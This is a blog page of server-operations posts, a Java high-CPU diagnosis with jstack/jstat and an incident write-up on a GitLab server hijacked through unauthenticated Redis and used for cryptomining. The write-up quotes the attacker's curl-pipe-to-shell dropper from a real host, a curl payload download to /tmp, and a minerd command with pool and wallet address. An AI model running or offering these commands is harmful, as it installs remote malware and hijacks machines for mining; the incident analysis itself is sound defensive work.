<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[root@account-tomcat-01 ~]$ top</div><div class="line">top - 14:51:10 up 233 days, 11:40,  2 users,  load average: 6.85, 5.62, 3.97</div><div class="line">Tasks: 192 total,   2 running, 190 sleeping,   0 stopped,   0 zombie</div><div class="line">%Cpu(s): 97.3 us,  0.3 sy,  0.0 ni,  2.5 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</div><div class="line">KiB Mem : 16268652 total,  5114392 free,  6907028 used,  4247232 buff/cache</div><div class="line">KiB Swap:  4063228 total,  3989708 free,    73520 used.  8751512 avail Mem </div><div class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                               </div><div class="line"></div><div class="line">14063 root       20   0 9260488 4.627g  11976 S 229.1 29.8 117:41.66 java</div></pre></td></tr></table></figure>
<h5 id="2-2ã€å®šä½é—®é¢˜çº¿ç¨‹"><a href="#2-2ã€å®šä½é—®é¢˜çº¿ç¨‹" class="headerlink" title="2.2ã€å®šä½é—®é¢˜çº¿ç¨‹"></a>2.2ã€å®šä½é—®é¢˜çº¿ç¨‹</h5><p>ä½¿ç”¨<code>ps -mp pid -o THREAD,tid,time</code>å‘½ä»¤æŸ¥çœ‹è¯¥è¿›ç¨‹çš„çº¿ç¨‹æƒ…å†µï¼Œå‘ç°è¯¥è¿›ç¨‹çš„å¤šä¸ªçº¿ç¨‹å ç”¨ç‡å¾ˆé«˜</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[root@account-tomcat-01 ~]$ ps -mp 14063 -o THREAD,tid,time </div><div class="line">USER     %CPU PRI SCNT WCHAN  USER SYSTEM   TID     TIME</div><div class="line">        361   -    - -         -      -     - 02:05:58</div><div class="line">root       0.0  19    - futex_    -      - 14063 00:00:00</div><div class="line">root       0.0  19    - poll_s    -      - 14064 00:00:00</div><div class="line">root      44.5  19    - -         -      - 14065 00:15:30</div><div class="line">root      44.5  19    - -         -      - 14066 00:15:30</div><div class="line">root      44.4  19    - -         -      - 14067 00:15:29</div><div class="line">root      44.5  19    - -         -      - 14068 00:15:30</div><div class="line">root      44.5  19    - -         -      - 14069 00:15:30</div><div class="line">root      44.5  19    - -         -      - 14070 00:15:30</div><div class="line">root      44.5  19    - -         -      - 14071 00:15:30</div><div class="line">root      44.6  19    - -         -      - 14072 00:15:32</div><div class="line">root       2.2  19    - futex_    -      - 14073 00:00:46</div><div class="line">root       0.0  19    - futex_    -      - 14074 00:00:00</div><div class="line">root       0.0  19    - futex_    -      - 14075 00:00:00</div><div class="line">root       0.0  19    - futex_    -      - 14076 00:00:00</div><div class="line">root       0.7  19    - futex_    -      - 14077 00:00:15</div></pre></td></tr></table></figure>
<p>ä»è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼Œ14065~14072ä¹‹é—´çš„çº¿ç¨‹CPUå ç”¨ç‡éƒ½å¾ˆé«˜<br>2.3ã€æŸ¥çœ‹é—®é¢˜çº¿ç¨‹å †æ ˆ</p>
<p>æŒ‘é€‰TIDä¸º14065çš„çº¿ç¨‹ï¼ŒæŸ¥çœ‹è¯¥çº¿ç¨‹çš„å †æ ˆæƒ…å†µï¼Œå…ˆå°†çº¿ç¨‹idè½¬ä¸º16è¿›åˆ¶ï¼Œä½¿ç”¨printf â€œ%x\nâ€ tidå‘½ä»¤è¿›è¡Œè½¬æ¢</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[root@account-tomcat-<span class="number">01</span> ~]$ printf <span class="string">"%x\n"</span> <span class="number">14065</span></div><div class="line"><span class="number">36</span>f1</div><div class="line">å†ä½¿ç”¨jstackå‘½ä»¤æ‰“å°çº¿ç¨‹å †æ ˆä¿¡æ¯ï¼Œå‘½ä»¤æ ¼å¼ï¼šjstack pid |grep tid -A <span class="number">30</span></div><div class="line"></div><div class="line">[root@root-web-<span class="number">01</span> ~]$ jstack <span class="number">14063</span> |grep <span class="number">36</span>f1 -A <span class="number">30</span></div><div class="line"><span class="string">"GC task thread#0 (ParallelGC)"</span> <span class="attr">prio=10</span> <span class="attr">tid=0x00007fa35001e800</span> <span class="attr">nid=0x36f1</span> runnable </div><div class="line"><span class="string">"GC task thread#1 (ParallelGC)"</span> <span class="attr">prio=10</span> <span class="attr">tid=0x00007fa350020800</span> <span class="attr">nid=0x36f2</span> runnable </div><div class="line"><span class="string">"GC task thread#2 (ParallelGC)"</span> <span class="attr">prio=10</span> <span class="attr">tid=0x00007fa350022800</span> <span class="attr">nid=0x36f3</span> runnable </div><div class="line"><span class="string">"GC task thread#3 (ParallelGC)"</span> <span class="attr">prio=10</span> <span class="attr">tid=0x00007fa350024000</span> <span class="attr">nid=0x36f4</span> runnable </div><div class="line"><span class="string">"GC task thread#4 (ParallelGC)"</span> <span class="attr">prio=10</span> <span class="attr">tid=0x00007fa350026000</span> <span class="attr">nid=0x36f5</span> runnable </div><div class="line"><span class="string">"GC task thread#5 (ParallelGC)"</span> <span class="attr">prio=10</span> <span class="attr">tid=0x00007fa350028000</span> <span class="attr">nid=0x36f6</span> runnable </div><div class="line"><span class="string">"GC task thread#6 (ParallelGC)"</span> <span class="attr">prio=10</span> <span class="attr">tid=0x00007fa350029800</span> <span class="attr">nid=0x36f7</span> runnable </div><div class="line"><span class="string">"GC task thread#7 (ParallelGC)"</span> <span class="attr">prio=10</span> <span class="attr">tid=0x00007fa35002b800</span> <span class="attr">nid=0x36f8</span> runnable </div><div class="line"><span class="string">"VM Periodic Task Thread"</span> <span class="attr">prio=10</span> <span class="attr">tid=0x00007fa3500a8800</span> <span class="attr">nid=0x3700</span> waiting on condition </div><div class="line"></div><div class="line">JNI global references: <span class="number">392</span></div></pre></td></tr></table></figure>
<p>ä»è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼Œæ­¤çº¿ç¨‹æ˜¯JVMçš„gcçº¿ç¨‹ã€‚æ­¤æ—¶å¯ä»¥åŸºæœ¬ç¡®å®šæ˜¯å†…å­˜ä¸è¶³æˆ–å†…å­˜æ³„éœ²å¯¼è‡´gcçº¿ç¨‹æŒç»­è¿è¡Œï¼Œå¯¼è‡´CPUå ç”¨è¿‡é«˜ã€‚</p>
<p>æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬è¦æ‰¾çš„å†…å­˜æ–¹é¢çš„é—®é¢˜</p>
<p>3.1ã€ä½¿ç”¨jstat -gcutilå‘½ä»¤æŸ¥çœ‹è¿›ç¨‹çš„å†…å­˜æƒ…å†µ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">[root@account-tomcat-01 ~]$ jstat -gcutil 14063 2000 10</div><div class="line"></div><div class="line">  S0     S1     E      O      P     YGC     YGCT    FGC    FGCT     GCT   </div><div class="line">  0.00   0.00 100.00  99.99  26.31     42   21.917   218 1484.830 1506.747</div><div class="line">  0.00   0.00 100.00  99.99  26.31     42   21.917   218 1484.830 1506.747</div><div class="line">  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484</div><div class="line">  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484</div><div class="line">  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484</div><div class="line">  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484</div><div class="line">  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484</div><div class="line">  0.00   0.00 100.00  99.99  26.31     42   21.917   220 1505.439 1527.355</div><div class="line">  0.00   0.00 100.00  99.99  26.31     42   21.917   220 1505.439 1527.355</div><div class="line">  0.00   0.00 100.00  99.99  26.31     42   21.917   220 1505.439 1527.355</div></pre></td></tr></table></figure>
<p>ä»è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼ŒEdenåŒºå†…å­˜å ç”¨100%ï¼ŒOldåŒºå†…å­˜å ç”¨99.99%ï¼ŒFull GCçš„æ¬¡æ•°é«˜è¾¾220æ¬¡ï¼Œå¹¶ä¸”é¢‘ç¹Full GCï¼ŒFull GCçš„æŒç»­æ—¶é—´ä¹Ÿç‰¹åˆ«é•¿ï¼Œå¹³å‡æ¯æ¬¡Full GCè€—æ—¶6.8ç§’ï¼ˆ1505.439/220ï¼‰ã€‚æ ¹æ®è¿™äº›ä¿¡æ¯ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯ç¨‹åºä»£ç ä¸Šå‡ºç°äº†é—®é¢˜ï¼Œå¯èƒ½å­˜åœ¨ä¸åˆç†åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹ã€‚</p>
<p>ç”Ÿäº§javaåº”ç”¨ï¼ŒCPUä½¿ç”¨ç‡ä¸€ç›´å¾ˆé«˜ï¼Œç»å¸¸è¾¾åˆ°100%ï¼Œé€šè¿‡ä»¥ä¸‹æ­¥éª¤å®Œç¾è§£å†³ï¼Œåˆ†äº«ä¸€ä¸‹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">1.jps è·å–Javaè¿›ç¨‹çš„PIDã€‚</div><div class="line"></div><div class="line">2.top -H -p PID æŸ¥çœ‹å¯¹åº”è¿›ç¨‹çš„å“ªä¸ªçº¿ç¨‹å ç”¨CPUè¿‡é«˜ã€‚</div><div class="line">2.1 ä½¿ç”¨ ps -mp pid -o THREAD,tid,time å‘½ä»¤æŸ¥çœ‹è¯¥è¿›ç¨‹çš„çº¿ç¨‹æƒ…å†µï¼Œå‘ç°è¯¥è¿›ç¨‹çš„å¤šä¸ªçº¿ç¨‹å ç”¨ç‡å¾ˆé«˜ã€‚</div><div class="line"></div><div class="line">3.jstack pid &gt;&gt; java.txt å¯¼å‡ºCPUå ç”¨é«˜è¿›ç¨‹çš„çº¿ç¨‹æ ˆã€‚</div><div class="line">ä½¿ç”¨jstackå‘½ä»¤æŸ¥çœ‹è¿›ç¨‹çš„å †æ ˆæƒ…å†µ</div><div class="line"></div><div class="line">4.echo â€œobase=16; PIDâ€ | bc å°†çº¿ç¨‹çš„PIDè½¬æ¢ä¸º16è¿›åˆ¶ã€‚</div><div class="line"></div><div class="line">5.åœ¨ç¬¬äºŒæ­¥å¯¼å‡ºçš„Java.txtä¸­æŸ¥æ‰¾è½¬æ¢æˆä¸º16è¿›åˆ¶çš„çº¿ç¨‹PIDã€‚æ‰¾åˆ°å¯¹åº”çš„çº¿ç¨‹æ ˆã€‚</div><div class="line"></div><div class="line">6.åˆ†æè´Ÿè½½é«˜çš„çº¿ç¨‹æ ˆéƒ½æ˜¯ä»€ä¹ˆä¸šåŠ¡æ“ä½œã€‚ä¼˜åŒ–ç¨‹åºå¹¶å¤„ç†é—®é¢˜ã€‚</div></pre></td></tr></table></figure>

	

	

</article>




	<article>
	
		<h1><a href="/2016/12/02/è¿ç»´å®‰å…¨/gitlabç½‘ç«™è¢«é»‘redisè¢«åŠ«æŒ6379ç«¯å£éœ€è¦æäº¤è®¤è¯ï¼Œå¦‚ä½•æŒ½æ•‘ï¼Ÿ/">gitlabç½‘ç«™è¢«é»‘redisè¢«åŠ«æŒ6379ç«¯å£éœ€è¦æäº¤è®¤è¯ï¼Œå¦‚ä½•æŒ½æ•‘ï¼Ÿ</a></h1>
	
	<div class="article__infos">
		<span class="article__date">2016-12-02</span><br />
		
			<span class="article__category">
				<a class="article-category-link" href="/categories/è¿ç»´å®‰å…¨/">è¿ç»´å®‰å…¨</a>
			</span><br />
		
		
			<span class="article__tags">
			  	<a class="article__tag-link" href="/tags/Operation-safety/">Operation safety</a>
			</span>
		
	</div>

	

	
		<p>ä»Šå¤©æ—©ä¸Š5ç‚¹å¤šæ”¶åˆ°é˜¿é‡Œäº‘çš„å‘Šè­¦ï¼šæœåŠ¡å™¨CPUç™¾åˆ†ç™¾ï¼ŒgitlabæœåŠ¡å™¨è®¿é—®å‡ºç°500ï¼Œç¬¬ä¸€æ—¶é—´æ’æŸ¥é—®é¢˜ã€‚<br>æ¯•ç«Ÿè¿™ä¸ªå…³ä¹ç€å¼€å‘ä»Šå¤©å¯èƒ½æ— æ³•æäº¤ä»£ç ã€‚</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_01.png" alt=""></figure><br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_02.png" alt=""></figure></p>
<h4 id="ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab-500ã€‚"><a href="#ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab-500ã€‚" class="headerlink" title="ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab 500ã€‚"></a>ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab 500ã€‚</h4><p>æ ¹æ®ä»¥å¾€ç»éªŒgitlabå‡ºç°500 ç¬¬ä¸€ï¼šç‰ˆæœ¬å‡ºç°bugï¼Œç¬¬äºŒï¼šæœåŠ¡å™¨ç½‘ç»œä¸æ­£å¸¸ï¼Œè¯·æ±‚ä¸åˆ°ã€‚</p>
<p>ç„¶åæŸ¥çœ‹æ—¥å¿—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[root@GitLab ~]<span class="comment"># tailf -1000 /home/git/gitlab/log/production.log</span></div><div class="line"></div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:14:26 +0800</div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:14:31 +0800</div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:14:37 +0800</div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:14:42 +0800</div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:15:35 +0800</div><div class="line">Started GET <span class="string">"/"</span> <span class="keyword">for</span> 177.154.56.233 at 2017-01-06 10:15:55 +0800</div><div class="line">Processing by DashboardController<span class="comment">#show as */*</span></div><div class="line">Completed 401 Unauthorized <span class="keyword">in</span> 55ms</div><div class="line"></div><div class="line">Redis::CommandError (NOAUTH Authentication required.):</div><div class="line">  config/initializers/redis-store-fix-expiry.rb:10:<span class="keyword">in</span> `block <span class="keyword">in</span> setex<span class="string">'</span></div><div class="line">  config/initializers/redis-store-fix-expiry.rb:10:in `setterâ€™</div></pre></td></tr></table></figure>
<p>è¿™é‡Œæç¤ºRediséœ€è¦è®¤è¯ï¼Œ<code>Redis::CommandError (NOAUTH Authentication required.)</code>:è¿™é‡Œå½“åˆå°±æ²¡æœ‰è®¤è¯çš„ï¼Œçªç„¶éœ€è¦è®¤è¯ï¼Œæ˜æ˜¾è¢«äººé»‘äº†ã€‚</p>
<p>å› ä¸ºredisæœåŠ¡åœ¨2016å¹´3æœˆä»½å®˜ç½‘å‘å¸ƒäº†ä¸€é¡¹é€šçŸ¥ï¼šä½¿ç”¨redisä¸»è¦è®¾ç½®å¯†ç ã€‚<br>å¯ä»¥çœ‹ä¸‹è¿™ç¯‡æ–‡ç« ï¼š</p>
<p><a href="http://www.oschina.net/news/67975/redis-defect?from=mail-notify" target="_blank" rel="external">Redis æœªæˆæƒè®¿é—®ç¼ºé™·å¯è½»æ˜“å¯¼è‡´ç³»ç»Ÿè¢«é»‘</a></p>
<p>å…¨çƒæ— éªŒè¯å¯ç›´æ¥åˆ©ç”¨ Redis TOP 10 å›½å®¶ä¸åœ°åŒº</p>
<p><figure class="figure"><img src="http://static.oschina.net/uploads/space/2015/1112/131046_hoNL_865233.jpg" alt=""></figure></p>
<p>è§£å†³æ–¹æ¡ˆ</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ä¸´æ—¶è§£å†³æ–¹æ¡ˆ                            </div><div class="line"></div><div class="line">é…ç½®<span class="keyword">bindé€‰é¡¹, </span>é™å®šå¯ä»¥è¿æ¥RedisæœåŠ¡å™¨çš„IP, å¹¶ä¿®æ”¹redisçš„é»˜è®¤ç«¯å£<span class="number">6379</span>.</div><div class="line"></div><div class="line">é…ç½®AUTH, è®¾ç½®å¯†ç , å¯†ç ä¼šä»¥æ˜æ–‡æ–¹å¼ä¿å­˜åœ¨redisé…ç½®æ–‡ä»¶ä¸­.</div><div class="line"></div><div class="line">é…ç½®rename-command <span class="built_in">CONFIG</span> <span class="string">"RENAME_CONFIG"</span>, è¿™æ ·å³ä½¿å­˜åœ¨æœªæˆæƒè®¿é—®, ä¹Ÿèƒ½å¤Ÿç»™æ”»å‡»è€…ä½¿ç”¨<span class="built_in">config</span>æŒ‡ä»¤åŠ å¤§éš¾åº¦</div><div class="line"></div><div class="line">å¥½æ¶ˆæ¯æ˜¯Redisä½œè€…è¡¨ç¤ºå°†ä¼šå¼€å‘â€real userâ€ï¼ŒåŒºåˆ†æ™®é€šç”¨æˆ·å’Œadminæƒé™ï¼Œæ™®é€šç”¨æˆ·å°†ä¼šè¢«ç¦æ­¢è¿è¡ŒæŸäº›å‘½ä»¤ï¼Œå¦‚<span class="built_in">config</span></div><div class="line"></div><div class="line">å®˜æ–¹è§£å†³æ–¹æ¡ˆ                            </div><div class="line"></div><div class="line">æš‚æ— å®˜æ–¹è§£å†³æ–¹æ¡ˆ</div></pre></td></tr></table></figure>
<p>ç°åœ¨ç‰ˆæœ¬gitlab 7.0ç‰ˆæœ¬çš„æ²¡æœ‰redisè®¾ç½®å¯†ç ä¸€é¡¹ï¼Œæ‰€ä»¥å°±è§‰å¾—å¥‡æ€ªï¼Œä¸ºä»€ä¹ˆä¼šæœ‰äººè®¾ç½®äº†å¯†ç ï¼Œç½‘ç«™å¯¼è‡´è·å–ä¸åˆ°æ•°æ®å°±å‡ºç°500äº†ã€‚</p>
<h4 id="æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100"><a href="#æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100" class="headerlink" title="æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100%"></a>æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100%</h4><p>é¦–å…ˆSSHç™»é™†ï¼ŒtopæŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°å¥‡æ€ªåå­—çš„å‘½ä»¤AnXqV, ddg.217éšè—è¿›ç¨‹ã€‚ è¿˜æœ‰ä¸€çœ‹å°±æ„Ÿè§‰æœ‰é—®é¢˜ã€‚</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_03.png" alt=""></figure></p>
<p>çŸ¥é“è¿™ä¸ªè¿›ç¨‹ç„¶åæˆ‘ä»¬å•ç‹¬çœ‹ä¸‹è¿™ä¸ªè¿›ç¨‹å…·ä½“æœ‰å“ªäº›ï¼š<br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_04.png" alt=""></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsof â€“c ddg.217</div></pre></td></tr></table></figure>
<p>æŸ¥çœ‹å…³è”æ–‡ä»¶ï¼Œå‘ç°å¯¹å¤–çš„tcpè¿æ¥ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯åå‘shellâ€¦</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_05.png" alt=""></figure></p>
<p>ä»è¿™é‡Œæ˜æ˜¾å¯ä»¥çœ‹çš„å‡ºæ¥ï¼Œæˆ‘çš„redis-6379 è¢«äººæ‹¿åˆ°shellæƒé™äº†ã€‚</p>
<p>ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼š</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_06.png" alt=""></figure></p>
<p>è¿™é‡Œæˆ‘åˆ°/root/.ddg/17.dbè¿™ä¸ªæ–‡ä»¶æˆ‘æ‰“å¼€çœ‹æ˜¯ä¹±ç åŠ å¯†è¿‡çš„ã€‚<br>åŠ å¯†çš„ çœ‹ä¸åˆ°æ•°æ®ã€‚<br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_07.png" alt=""></figure></p>
<h6 id="è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š"><a href="#è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š" class="headerlink" title="è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š"></a>è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rm -rf /root/.ddg  åˆ é™¤ä¾èµ–ã€‚ä»–ä¾èµ–äºå“ªä¸ªæ–‡ä»¶ï¼Œç„¶åç»™åŠ ä¸€ä¸ªæƒé™ä½ï¼šchattr  +s  filename</div><div class="line">åˆ é™¤æ‰äº† ä½ æ‰‹åŠ¨åˆ›å»ºï¼Œç„¶ååŠ æƒé™ä½ã€‚</div></pre></td></tr></table></figure>
<h6 id="ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š"><a href="#ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š" class="headerlink" title="ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š"></a>ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">139.222.173.127</div><div class="line">139.70.199.90</div><div class="line">.....</div><div class="line">åé¢å°±ä¸ç”¨è§£é‡Šäº†ï¼Œè¿™ä¸ªæ˜æ˜¾å½“`è‚‰é¸¡`äº†ã€‚</div></pre></td></tr></table></figure>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_08.png" alt=""></figure></p>
<p>ä¸´æ—¶æ–¹æ³•é˜²ç«å¢™é…ç½®å±è”½è¿™äº›IPåœ°å€ã€‚ æ²»æ ‡ä¸æ²»æœ¬ã€</p>
<p>è¿™é‡Œè§£å†³æ‰<code>12506</code>è¿›ç¨‹ï¼škill -9 12506</p>
<p>é…ç½® ä¸€ä¸ªhosts  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">10.0.1.110   www.haveabitchin.com  é…ç½®æˆ ç™¾åº¦çš„ip</div></pre></td></tr></table></figure>
<p>å¸®ä»–é…é”™åœ°å€,ä»–è‚¯å®šè¯·æ±‚ä¸‹è½½ ä¸åˆ°è¿™ä¸ªè„šæœ¬äº†.</p>
<p>ç„¶åæŒ‰è¿›ç¨‹ç¨‹åºç›®å½•ä¸‹é¢è¿›å…¥/tmp/åˆ é™¤ ddg.217æ–‡ä»¶ï¼Œåˆ é™¤duchduckgo.17.log è¿™ä¸ªæ˜¯ç—…æ¯’è¿è¡Œè¿›ç¨‹è¾“å‡ºçš„æ—¥å¿—æ–‡ä»¶ï¼Œ<br>åˆ é™¤hsperfadata_root è¿™ä¸ªæ–‡ä»¶é‡Œé¢æ˜¯ä¸ªè¿›ç¨‹ï¼Œä¹Ÿåˆ é™¤ã€‚</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_09.png" alt=""></figure></p>
<p>ç„¶ååœ¨çœ‹çœ‹æ˜¯å¦è¿˜æœ‰æ²¡æœ‰è¿™ä¸ªè¿›ç¨‹ï¼š<br>åˆå¯åŠ¨<code>13929</code>è¿™ä¸ªè¿›ç¨‹ï¼ŒæœåŠ¡è¿˜æ˜¯å ç”¨å¾ˆé«˜èµ„æºCPUï¼š100%<br>å®šä½åˆ°æ˜¯å“ªä¸ªç¨‹åº å‘èµ·çš„è¯·æ±‚.æŸ¥çœ‹ï¼š<code>13918</code>è¿™ä¸ªè¿›ç¨‹ï¼š<br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_10.png" alt=""></figure></p>
<p>ä»è¿™é‡Œæ˜æ˜¾å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ä¸ªåœ°å€ï¼š</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="regexp">/bin/</span>sh -c curl -fsSL <span class="string">http:</span><span class="comment">//www.haveabitchin.com/pm.sh?0105008 | sh</span></div><div class="line">curl -fsSL <span class="string">http:</span><span class="comment">//www.haveabitchin.com/ddg.x86_64 -o /tmp/ddg.217</span></div></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ˜æ˜¾æ˜¯å“ªä¸ªç¨‹åºä¸€ç›´åœ¨å¯åŠ¨ã€‚</p>
<h5 id="ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼š"><a href="#ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼š" class="headerlink" title="ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼š"></a>ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼š</h5><p>åˆ é™¤è¿™äº›å‘ç°è¿˜æ˜¯CPUç™¾åˆ†ç™¾ï¼š<br>åœ¨ç»§ç»­æŸ¥çœ‹è¿›ç¨‹ï¼š</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_11.png" alt=""></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root     26373     1 96 Jan01 ?        4-12:14:03 ./minerd -B <span class="_">-a</span> cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44GpQ3X9aCR5fMfD8myxKQcAYjkTdT5KrM4NM2rM9yWnEkP28mmXu5URUCxwuvKiVCQPZaoYkpxxzKoCpnED6Gmb2wWJRuN -p x</div></pre></td></tr></table></figure>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_12.png" alt=""></figure></p>
<p>è¿™ä¸ªè¿›ç¨‹æ˜¯ä»€ä¹ˆï¼šmined ç™¾åº¦å‘Šè¯‰æˆ‘ä»¬äº†: <a href="https://zhidao.baidu.com/question/1928020622935195267.html" target="_blank" rel="external">minedè‚‰é¸¡æœ¨é©¬</a> å¾ˆåƒCPUä¸€ç§ç—…æ¯’ã€‚</p>
